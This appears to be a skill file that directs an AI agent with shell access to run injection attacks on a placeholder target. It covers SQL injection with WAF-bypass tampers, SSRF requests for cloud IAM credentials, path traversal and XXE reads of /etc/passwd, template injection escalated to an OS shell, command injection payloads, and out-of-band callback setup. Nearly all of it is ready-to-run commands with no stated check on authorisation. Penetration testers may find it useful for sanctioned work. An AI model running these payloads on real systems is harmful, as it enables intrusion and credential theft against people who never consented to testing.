---
name: injection
description: Injection testing — SQLi, XSS, SSTI, LFI/RFI, XXE, SSRF, CMDi with WAF bypass
allowed-tools: [Bash, Read, Write]
---
> **OOB callbacks (Tzar-Bot):** No Burp Collaborator MCP is wired into this platform. For out-of-band confirmation, executor agents should use **interactsh** — run `interactsh-client -json -o $OUTPUT_DIR/recon/interactsh.log` in a side terminal; it prints a unique `*.oast.fun` host and live-logs DNS/HTTP/SMTP hits. Set `COLLAB=<that-host>` and reuse it anywhere the per-class references under `reference/` mention Burp Collaborator or `$COLLAB`. Burp Collaborator stays valid if the operator has Burp open.

# Injection Testing

Test all injection vectors. See `reference/input-validation.md` and `reference/waf-analysis.md` for detailed payloads.

## Tools

| Tool | Purpose |
|------|---------|
| sqlmap | Automated SQL injection |
| ghauri | Advanced SQLi (WAF bypass focus) |
| dalfox | XSS scanner |
| tplmap | SSTI detection and exploitation |
| commix | Command injection |
| ssrfmap | SSRF exploitation |
| ffuf | Parameter fuzzing with payload lists |
| nuclei | Template-based injection checks |

## SQL Injection

```bash
# Automated — basic
sqlmap -u "TARGET/page?id=1" --batch --level=3 --risk=2 \
  --output-dir=OUTPUT_DIR/tools/sqlmap/

# With WAF bypass tamper scripts
sqlmap -u "TARGET/page?id=1" --batch --tamper=space2comment,between,randomcase \
  --output-dir=OUTPUT_DIR/tools/sqlmap/

# POST request
sqlmap -u TARGET/login --data="username=admin&password=test" --batch \
  --output-dir=OUTPUT_DIR/tools/sqlmap/

# Advanced WAF bypass (ghauri)
ghauri -u "TARGET/page?id=1" --batch --level=3 --output OUTPUT_DIR/logs/ghauri.txt
```

## XSS

```bash
# Reflected XSS scan
dalfox url "TARGET/search?q=test" --output OUTPUT_DIR/logs/dalfox.txt

# Parameter-based fuzzing
ffuf -u "TARGET/search?q=FUZZ" -w config/payloads/xss.txt \
  -mr "<script|onerror|onload" -o OUTPUT_DIR/logs/xss-ffuf.json -of json

# DOM XSS — check JavaScript source
grep -r "innerHTML\|document\.write\|eval(" OUTPUT_DIR/recon/js-*.txt 2>/dev/null
```

## SSRF

```bash
# Basic SSRF test
ffuf -u TARGET/api/fetch?url=FUZZ -w config/payloads/ssrf.txt \
  -mr "169.254|localhost|127.0.0.1" -o OUTPUT_DIR/logs/ssrf-ffuf.json -of json

# Cloud metadata SSRF
curl -s "TARGET/proxy?url=http://169.254.169.254/latest/meta-data/" | head -20
curl -s "TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

## LFI / Path Traversal

```bash
ffuf -u "TARGET/page?file=FUZZ" -w config/payloads/lfi.txt \
  -mr "root:|bin/bash|\\[boot\\]" -o OUTPUT_DIR/logs/lfi-ffuf.json -of json

# Null byte bypass
curl -s "TARGET/page?file=../../../etc/passwd%00"
# PHP filter chain
curl -s "TARGET/page?file=php://filter/convert.base64-encode/resource=/etc/passwd"
```

## SSTI (Server-Side Template Injection)

```bash
# Detection payloads (check if math is evaluated)
for payload in "{{7*7}}" "#{7*7}" "${7*7}" "<%=7*7%>" "{7*7}"; do
  result=$(curl -s "TARGET/render?template=$payload" | grep -o "[0-9]*")
  [ "$result" = "49" ] && echo "SSTI confirmed with: $payload"
done

# Exploitation
tplmap -u "TARGET/render?template=*" --os-shell
```

## Command Injection

```bash
commix -u "TARGET/ping?host=127.0.0.1" --batch --output-dir=OUTPUT_DIR/tools/commix/

# Manual payloads
curl -s "TARGET/ping?host=127.0.0.1;id"
curl -s "TARGET/ping?host=127.0.0.1|whoami"
curl -s "TARGET/ping?host=127.0.0.1%0Aid"   # URL-encoded newline
```

## XXE

```bash
# Basic XXE probe
curl -s -X POST TARGET/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

## WAF Bypass Techniques

See `reference/waf-analysis.md` for full list. Key techniques:
- Case variation: `SeLeCt` instead of `SELECT`
- Comment insertion: `SE/**/LECT`
- URL encoding: `%27` for `'`
- Double encoding: `%2527`
- Chunked transfer: HTTP header `Transfer-Encoding: chunked`
- Payloads in `config/payloads/waf-bypass.txt`

## Output

Each confirmed injection → `OUTPUT_DIR/findings/finding-NNN/`

---

## Deep-dive references (authoritative)

The inline sections above are **quick-start orchestration**. For real testing of any area below, the `reference/` file is the **source of truth** (curated from disclosed reports — payloads, bypass tables, chain templates). Load it before deep testing; don't rely on the quick-start commands alone.

- `reference/hunt-sqli.md` — Deep SQLI hunting — payloads, bypass tables, and disclosed-report chains.
- `reference/hunt-ssrf.md` — Deep SSRF hunting — payloads, bypass tables, and disclosed-report chains.
- `reference/hunt-ssti.md` — Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako…
- `reference/hunt-xss.md` — Deep XSS hunting — payloads, bypass tables, and disclosed-report chains.
- `reference/hunt-xxe.md` — Deep XXE hunting — payloads, bypass tables, and disclosed-report chains.
- `reference/hunt-lfi.md` — Hunt Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal…
- `reference/hunt-rce.md` — Deep RCE hunting — payloads, bypass tables, and disclosed-report chains.
